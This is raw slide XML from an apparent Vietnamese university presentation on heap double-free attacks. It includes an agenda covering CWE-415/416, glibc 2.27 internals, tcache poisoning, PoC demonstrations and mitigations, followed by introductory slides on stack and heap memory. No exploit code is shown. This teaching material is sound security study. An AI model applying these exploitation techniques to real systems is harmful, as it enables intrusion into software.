            <a:ext cx="2281428" cy="94183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Phần 01 nền tảng bộ nhớ · phần 02 arenas · phần 03 double free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3332988" y="1417320"/>
            <a:ext cx="2647188" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="158191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YÊU CẦU 2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="1874520"/>
            <a:ext cx="2281428" cy="73152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Mã CWE tương ứng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="2651760"/>
            <a:ext cx="2281428" cy="94183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CWE-415 Double Free · CWE-416 Use After Free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="1417320"/>
            <a:ext cx="2647188" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="158191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YÊU CẦU 3</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="1874520"/>
            <a:ext cx="2281428" cy="73152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Vị trí lỗ hổng và nguyên nhân</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="2651760"/>
            <a:ext cx="2281428" cy="94183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Source glibc-2.27: __libc_free, _int_free, tcache_put/get · PoC 5.5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9084564" y="1417320"/>
            <a:ext cx="2647188" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="158191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YÊU CẦU 4</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="1874520"/>
            <a:ext cx="2281428" cy="73152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CVE thực tế liên quan</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="2651760"/>
            <a:ext cx="2281428" cy="94183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Phần 07: CVE-2026-33824, CVE-2026-23918, CVE-2025-62215</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3931920"/>
            <a:ext cx="2647188" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="409651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YÊU CẦU 5</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4389120"/>
            <a:ext cx="2281428" cy="73152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Chuỗi khai thác và mối liên hệ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5166360"/>
            <a:ext cx="2281428" cy="94183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Phần 04: tcache poisoning, sơ đồ lỗ hổng · CWE · kỹ thuật · CVE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3332988" y="3931920"/>
            <a:ext cx="2647188" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="409651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YÊU CẦU 6</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 24"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="4389120"/>
            <a:ext cx="2281428" cy="73152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Demo Pwnable thủ công và có AI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3515868" y="5166360"/>
            <a:ext cx="2281428" cy="94183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Phần 05: PoC Sink A / Sink B trong container glibc 2.27</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="3931920"/>
            <a:ext cx="2647188" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="409651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YÊU CẦU 7</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="4389120"/>
            <a:ext cx="2281428" cy="73152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Biện pháp khắc phục, phòng ngừa</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Text 29"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6391656" y="5166360"/>
            <a:ext cx="2281428" cy="94183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Phần 08: mã nguồn, công cụ, allocator, vận hành</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9084564" y="3931920"/>
            <a:ext cx="2647188" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Text 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="409651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YÊU CẦU 8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Text 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="4389120"/>
            <a:ext cx="2281428" cy="73152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Điều kiện, cơ chế bảo vệ, giới hạn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 33"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9267444" y="5166360"/>
            <a:ext cx="2281428" cy="94183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Phần 06: điều kiện cần, 7 tầng bảo vệ, vì sao vẫn có CVE</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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640080"/>
            <a:ext cx="4572000" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="14000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>01</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="14000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="100" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="3063240"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="4400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Nền tảng bộ nhớ</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="body" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="4343400"/>
            <a:ext cx="6949440" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Yêu cầu 1 · stack, heap, cấu trúc chunk, bin và tcache</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="914400"/>
            <a:ext cx="3593592" cy="5120640"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2036"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1143000"/>
            <a:ext cx="3108960" cy="27432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NỘI DUNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8366760" y="1554480"/>
            <a:ext cx="3154680" cy="4297680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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1.1  Stack</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1.2  Heap</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3    Ranh giới OS vs glibc</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3.1  Cấu trúc heap chunk</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3.2  malloc() cấp phát</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3.3  Bins</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4    Tcache</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Stack và Heap</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1 · HAI VÙNG NHỚ CỦA MỘT TIẾN TRÌNH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="5852160" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1524"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 0" descr="/home/nhanlaptop/UIT/NT521/Heap-Double-Free-Attack/image-1.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1725930"/>
            <a:ext cx="5577840" cy="4183380"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="1417320"/>
            <a:ext cx="5193792" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="1581912"/>
            <a:ext cx="482803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1.1 STACK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="1874520"/>
            <a:ext cx="4828032"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Biến local, tham số, return address</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="2331720"/>
            <a:ext cx="4828032" cy="126187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LIFO: mỗi lời gọi hàm push một stack frame</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tự hủy khi hàm trả về, không cần free</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Mỗi thread một stack riêng (8 MB mặc định)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6537960" y="3931920"/>
            <a:ext cx="5193792" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="4096512"/>
            <a:ext cx="482803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1.2 HEAP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="4389120"/>
            <a:ext cx="4828032"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Cấp phát động bằng malloc()/free()</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6720840" y="4846320"/>
            <a:ext cx="4828032" cy="126187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Kích thước, thời điểm chỉ biết lúc chạy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Vòng đời do lập trình viên kiểm soát</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dùng chung giữa các thread (main arena)</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Stack: vùng nhớ LIFO của lời gọi hàm</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1.1 · STACK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="4937760" cy="3474720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2105"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Image 0" descr="/home/nhanlaptop/UIT/NT521/Heap-Double-Free-Attack/image-2.png">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="594360" y="1610183"/>
            <a:ext cx="4663440" cy="3088994"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5120640"/>
            <a:ext cx="4937760" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5285232"/>
